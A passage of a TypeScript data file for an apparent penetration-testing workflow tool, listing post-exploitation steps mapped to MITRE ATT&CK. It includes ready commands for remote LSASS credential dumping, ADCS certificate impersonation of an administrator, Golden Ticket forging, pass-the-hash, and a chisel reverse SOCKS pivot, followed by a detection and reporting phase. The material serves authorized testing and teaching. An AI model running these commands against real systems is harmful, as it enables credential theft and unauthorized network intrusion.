            label: 'lsassy — remote LSASS dump via netexec module',
            command: 'mkdir -p engagements/{target}/post-ex && netexec smb {target} -u user -p pass -M lsassy 2>&1 | tee engagements/{target}/post-ex/lsassy.txt',
            techApplies: ['ldap'],
            mitreTechniques: ['T1003.001'],
          },
          {
            label: 'certipy — request a cert as another user (ADCS ESC1)',
            command: 'mkdir -p engagements/{target}/post-ex && certipy req -u user@DOMAIN -p pass -dc-ip {target} -ca CA-NAME -template VulnerableTemplate -upn administrator@DOMAIN -out engagements/{target}/post-ex/esc1-cert',
            techApplies: ['kerberos', 'ldap'],
            mitreTechniques: ['T1649'],
          },
          {
            label: 'certipy — auth as that user with the issued cert (PKINIT)',
            command: "mkdir -p engagements/{target}/post-ex && certipy auth -pfx engagements/{target}/post-ex/esc1-cert.pfx -dc-ip {target} 2>&1 | tee engagements/{target}/post-ex/esc1-auth.txt",
            techApplies: ['kerberos'],
            mitreTechniques: ['T1649'],
          },
          {
            label: 'ticketer — forge a Golden Ticket (lab; needs krbtgt hash)',
            command: 'mkdir -p engagements/{target}/post-ex && impacket-ticketer -nthash KRBTGT_NTHASH -domain-sid DOMAIN_SID -domain DOMAIN administrator',
            appliesTo: ['lab'],
            techApplies: ['kerberos'],
            mitreTechniques: ['T1558.001'],
          },
        ],
        branches: [
          { if: 'creds for additional hosts in scope', goto: 'post-ex' },
          { if: 'krbtgt hash in hand', goto: 'post-ex' },
        ],
        tools: [
          { name: 'mimikatz', url: 'https://github.com/gentilkiwi/mimikatz', kind: 'cli', note: 'Canonical Windows cred extraction \u2014 caught instantly by EDR; lab-default, careful elsewhere' },
          { name: 'Rubeus', url: 'https://github.com/GhostPack/Rubeus', kind: 'cli', note: 'Kerberos-focused alternative \u2014 less catastrophic AV signature', techApplies: ['kerberos'] },
          { name: 'Impacket secretsdump', url: 'https://github.com/fortra/impacket', kind: 'cli', note: 'Remote SAM/LSA dump from a privileged context \u2014 quieter than mimikatz' },
          { name: 'Certipy', url: 'https://github.com/ly4k/Certipy', kind: 'cli', note: 'ADCS abuse \u2014 ESC1 (request cert as another user), ESC8 (NTLM relay)', techApplies: ['kerberos', 'ldap'] },
          { name: 'lsassy', url: 'https://github.com/Hackndo/lsassy', kind: 'cli', note: 'Remote LSASS dump + parse \u2014 NetExec-integrated, less local footprint than mimikatz' },
        ],
      },
      {
        title: 'Lateral movement (if in scope)',
        description:
          'Use harvested credentials to reach other in-scope hosts. Pass-the-hash, Kerberos ticket reuse, SSH key pivots, RDP. STOP at the scope boundary — pivoting one host beyond authorization is the most common engagement-killing mistake.',
        appliesTo: ['private', 'lab'],
        commands: [
          {
            label: 'windows — pass-the-hash via netexec',
            command: "netexec smb {target} -u user -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 -x 'whoami'",
            osApplies: ['windows'],
            mitreTechniques: ['T1550.002', 'T1021.002'],
          },
          {
            label: 'windows — evil-winrm shell',
            command: 'evil-winrm -i {target} -u user -p pass',
            osApplies: ['windows'],
            mitreTechniques: ['T1021.006'],
          },
          {
            label: 'linux — reuse harvested SSH key',
            command: 'ssh -i ./loot/id_ed25519 user@{target}',
            osApplies: ['linux'],
            mitreTechniques: ['T1021.004', 'T1552.004'],
          },
          {
            label: 'linux — sshuttle for transparent VPN over SSH',
            command: 'sshuttle -r user@{target} 10.0.0.0/24',
            osApplies: ['linux'],
            mitreTechniques: ['T1572'],
          },
          {
            label: 'chisel — reverse SOCKS pivot (cross-platform)',
            command: 'chisel server -p 8000 --reverse  # attacker side; on host: chisel client your-ip:8000 R:1080:socks',
            mitreTechniques: ['T1090.001', 'T1572'],
          },
        ],
        tools: [
          { name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec', kind: 'cli', note: 'Pass-the-hash, command exec across SMB/WinRM/etc.', osApplies: ['windows'] },
          { name: 'Evil-WinRM', url: 'https://github.com/Hackplayers/evil-winrm', kind: 'cli', osApplies: ['windows'] },
          { name: 'sshuttle', url: 'https://github.com/sshuttle/sshuttle', kind: 'cli', note: 'Transparent VPN over SSH — Linux-pivot favorite', osApplies: ['linux'] },
          { name: 'chisel', url: 'https://github.com/jpillora/chisel', kind: 'cli', note: 'Tunnel / pivot through restricted networks (cross-platform)' },
        ],
      },
      {
        title: 'Update the cleanup log continuously',
        description:
          'Every artifact: filename, full path, timestamp, what it does, how to remove it. Every account/key/scheduled-task you create. Every service you start. End-of-engagement removal is your obligation; the log is your only safety net.',
        commands: [
          {
            label: 'init cleanup log template',
            command: "mkdir -p engagements/{target}/post-ex && cat > engagements/{target}/post-ex/cleanup.md <<'EOF'\n# Cleanup log — {target}\n\n| time | host | type | path / name | how to remove |\n|------|------|------|-------------|----------------|\nEOF",
          },
        ],
        branches: [
          { if: 'enough impact demonstrated — write up the engagement', goto: 'defense' },
        ],
      },
    ],
    output:
      'An impact narrative ("with the foothold in step X, we then reached Y, accessing Z") backed by evidence. A complete cleanup log of every artifact created. Any captured credentials/data treated per RoE (encrypted at rest, deleted post-engagement unless retention is required).',
    tags: ['post-ex', 'creds'],
    team: 'offense',
  },

  /* ─────────────── Phase 5: Defense & detection ─────────────── */
  {
    slug: 'defense',
    index: 5,
    name: 'Defense & detection',
    short: 'Defense',
    blurb:
      'Understand how the blue team catches you. Map your activity to ATT&CK, identify detection gaps, and cross-pollinate findings. Most valuable on `private` engagements; optional/personal-development for `bug-bounty` and `lab`.',
    goal:
      "A red engagement that ignores the blue side is a junior engagement. **Applicability differs by engagement**: for `private`, this is the highest-leverage output \u2014 the client buys the report PDF for findings, but they buy you for the detection-gap analysis. For `bug-bounty`, programs rarely care, but the discipline of mapping your own activity sharpens tradecraft. For `lab`, this is purple-team practice \u2014 useful for personal development, irrelevant to the box itself.",
    preChecks: [
      {
        appliesTo: ['private'],
        text: 'Schedule a debrief with the blue team. The post-engagement readout is more valuable than the report PDF \u2014 they get to ask questions, you get to learn what they did and didn\u2019t see.',
      },
      {
        appliesTo: ['private'],
        text: 'Bring a sanitized copy of your activity log (timestamps, source IPs, commands run) to the debrief. The blue team will ask for them; having them ready earns trust + lets the conversation move past triage.',
      },
      {
        appliesTo: ['bug-bounty'],
        text: "Optional: some programs include a 'what would have detected this' section in submissions \u2014 read the program's submission guidelines. Otherwise this phase is personal-development discipline; do it for your own learning.",
      },
      {
        appliesTo: ['lab'],
        text: 'Lab targets do not have blue teams. Do this phase as purple-team practice \u2014 it builds the muscle for real engagements where it matters.',
      },
      {
        text: 'Pull together your activity log: timestamps of every command, every request, every login. The mapping below depends on having this.',
      },
    ],
    steps: [
      {
        title: 'Map activity to MITRE ATT&CK',
        description:
          'For each meaningful step in the engagement (recon → exploit → post-ex), identify the ATT&CK technique that describes it. A clean mapping makes the report immediately actionable for the blue team.',
        commands: [
          {
            label: 'pull ATT&CK Enterprise dataset for offline lookup',
            command: 'mkdir -p engagements/{target}/defense && curl -sL https://raw.githubusercontent.com/mitre/cti/master/enterprise-attack/enterprise-attack.json -o engagements/{target}/defense/attack-data.json',
          },
          {
            label: 'jq — pull a technique by ID',
            command: "jq '.objects[] | select(.external_references[]?.external_id==\"T1059\") | {name, kill_chain_phases, description}' engagements/{target}/defense/attack-data.json",
          },
        ],
        tools: [
          { name: 'MITRE ATT&CK', url: 'https://attack.mitre.org/', kind: 'web', note: 'Authoritative technique catalog' },
          { name: 'ATT&CK Navigator', url: 'https://mitre-attack.github.io/attack-navigator/', kind: 'web', note: 'Visualize covered techniques on the ATT&CK matrix' },
        ],
      },
      {
        title: 'Identify what would have triggered detection',
        description:
          'For each technique, find the corresponding Sigma rules, vendor-published detections (Splunk, Sentinel, Elastic), and atomic-red-team test cases. What WOULD have caught your activity in a well-instrumented environment?',
        commands: [
          {
            label: 'clone sigma rules + grep by ATT&CK ID',
            command: 'git clone --depth 1 https://github.com/SigmaHQ/sigma /tmp/sigma 2>/dev/null; mkdir -p engagements/{target}/defense && grep -rl "attack.t1059" /tmp/sigma/rules/ | tee engagements/{target}/defense/sigma-t1059.txt',
          },
          {
            label: 'atomic-red-team — find test cases per technique',
            command: 'mkdir -p engagements/{target}/defense && curl -sL https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059/T1059.md -o engagements/{target}/defense/atomic-T1059.md',
          },
        ],
        tools: [
          { name: 'Sigma rules', url: 'https://github.com/SigmaHQ/sigma', kind: 'cli', note: 'Open detection rule format + huge community ruleset' },
          { name: 'atomic-red-team', url: 'https://github.com/redcanaryco/atomic-red-team', kind: 'cli', note: 'Per-technique test cases' },
          { name: 'Splunk Security Content', url: 'https://research.splunk.com/', kind: 'web' },
        ],
      },
      {
        title: 'Identify detection gaps',
        description:
          "Compare the techniques you used against the detections that exist. Gaps are the most valuable finding for the blue team — they're either rules they should write, or telemetry they're missing entirely (e.g. 'no Sysmon, no PowerShell logging').",
        tools: [
          { name: 'MITRE D3FEND', url: 'https://d3fend.mitre.org/', kind: 'web', note: 'Defensive countermeasure catalog mapped to ATT&CK' },
          { name: 'MITRE CAR', url: 'https://car.mitre.org/', kind: 'web', note: 'Cyber Analytics Repository — analytics per technique' },
        ],
      },
      {
        title: 'Recommend specific improvements',
        description:
          "Each gap → a concrete recommendation: a Sigma rule to deploy, a log source to enable (Sysmon, AzureAD sign-in logs, EDR, auditd), a baseline alert to configure. Prefer specific, deployable suggestions over 'they should improve detection.'",
        tools: [
          { name: 'Sysmon Modular', url: 'https://github.com/olafhartong/sysmon-modular', kind: 'cli', note: 'Battle-tested Sysmon config', osApplies: ['windows'] },
          { name: 'PurpleSharp', url: 'https://github.com/mvelazc0/PurpleSharp', kind: 'cli', note: 'Adversary simulation for blue-team validation', osApplies: ['windows'] },
          { name: 'auditd / Laurel', url: 'https://github.com/threathunters-io/laurel', kind: 'cli', note: 'Linux audit-event enrichment for SIEM ingest', osApplies: ['linux'] },
        ],
      },
      {
        title: 'Document in the report',
        description:
          'Each finding gets: the technique mapping, what was/wasn\'t detected, the recommended detection or telemetry. Bonus points for a coverage heatmap (use ATT&CK Navigator). The blue team should be able to action it without asking questions.',
        commands: [
          {
            label: 'init report skeleton',
            command: "mkdir -p engagements/{target}/defense && cat > engagements/{target}/defense/report.md <<'EOF'\n# {target} — engagement report\n\n## Findings\n\n## Detection coverage\n\n| ATT&CK ID | technique | observed? | recommendation |\n|-----------|-----------|-----------|----------------|\n\n## Cleanup status\n\n## Appendix — evidence index\nEOF",
          },
        ],
        tools: [
          { name: 'ATT&CK Navigator', url: 'https://mitre-attack.github.io/attack-navigator/', kind: 'web', note: 'Build the coverage heatmap layer here' },
        ],
      },
    ],
    output:
      "A detection-coverage section of the report: ATT&CK mapping of the engagement's notable activity, an analysis of what was caught vs missed, and concrete recommendations (Sigma rules, log sources, configuration changes). For internal engagements: a debrief session with the blue team where you walk through the same material live.",
    tags: ['defense'],
    team: 'defense',
  },
];

/* ============================================================ Helpers */

/* Three filter axes converge on each item: engagement (`appliesTo`),
   target OS (`osApplies`), and tech stack (`techApplies`). All three
   must pass for the item to render. */
import { isOSVisible, type TargetOSChoice } from '@/lib/target-os';
import { isTechVisible } from '@/lib/tech-tags';

/**
 * Returns the engagement+OS+tech-filtered visible steps for a phase,
 * with each step's original index preserved so callers can build
 * progress ids without losing the stable identity (filter changes the
 * visible set but not the original indexes).
 */
/** Stable id for an item under a phase — `${phaseSlug}:${kind}:${index}`.
 *  Used as the key for `state.progress` (per-item completion) and
 *  re-used by the defense thread-back to look up which steps the
 *  user has marked done. Centralised here so any consumer that
 *  needs the same id format reads from a single source. */
export function itemId(
  phaseSlug: string,
  kind: 'precheck' | 'step',
  index: number,
): string {
  return `${phaseSlug}:${kind}:${index}`;
}

/** Stable id for an individual command under a step —
 *  `${phaseSlug}:cmd:${stepIndex}:${commandIndex}`. Distinct kind
 *  (`cmd`) so it can\'t collide with `step` / `precheck` ids in
 *  the same `progress` set. Marking a command complete records
 *  "I actually ran this," which is what the defense thread-back
 *  + Map view derive ATT&CK attribution from. Step completion is
 *  a separate workflow signal — strip-dot colour + auto-advance
 *  cue, not an attribution claim. */
export function commandItemId(
  phaseSlug: string,
  stepIndex: number,
  commandIndex: number,
): string {
  return `${phaseSlug}:cmd:${stepIndex}:${commandIndex}`;
}

export function visibleStepsForPhase(
  phase: Phase,
  engagement: Engagement | null,
  os: TargetOSChoice | null = null,
  techTags: TechTag[] = [],
): Array<{ step: PhaseStep; originalIndex: number }> {
  return phase.steps
    .map((step, originalIndex) => ({ step, originalIndex }))
    .filter(({ step }) => {
      const engOk =
        !step.appliesTo ||
        (engagement && step.appliesTo.includes(engagement));
      const osOk = isOSVisible(step.osApplies, os);
      const techOk = isTechVisible(step.techApplies, techTags);
      return engOk && osOk && techOk;
    });
}

/** Same as `visibleStepsForPhase`, but for pre-checks. */
export function visiblePreChecksForPhase(
  phase: Phase,
  engagement: Engagement | null,
  os: TargetOSChoice | null = null,
  techTags: TechTag[] = [],
): Array<{ check: PreCheck; originalIndex: number }> {
  return (phase.preChecks ?? [])
    .map((check, originalIndex) => ({ check, originalIndex }))
    .filter(({ check }) => {
      const engOk =
        !check.appliesTo ||
        (engagement && check.appliesTo.includes(engagement));
      const osOk = isOSVisible(check.osApplies, os);
      const techOk = isTechVisible(check.techApplies, techTags);
      return engOk && osOk && techOk;
    });
}

